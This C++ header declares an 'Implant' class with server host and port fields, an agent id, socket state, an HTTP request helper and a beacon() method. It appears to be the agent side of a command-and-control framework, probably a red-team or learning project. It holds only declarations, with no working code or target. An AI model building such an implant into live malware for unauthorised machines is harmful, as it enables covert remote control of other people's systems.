#pragma once

#include "tasks.h"

#include <iostream>
#include <string>
#include <optional>
#include <vector>
#include <random>
#include <nlohmann/json.hpp>

#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

class Implant {
private:
    const std::string host, port;
    std::string id;
    bool isRunning;

    struct addrinfo hints;
    struct addrinfo* result;

    int socket_fd;
    int status;

    enum class HttpMethod {
        GET,
        POST,
    };

    [[nodiscard]] std::string sendHttpRequest(std::string_view path="/",
    HttpMethod method = HttpMethod::GET,
	const nlohmann::json& payload = {});

public:
    Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning = false);
    ~Implant();

    void beacon();
    void setRunning(bool isRunning);
    void setId(std::string& implantId);
};


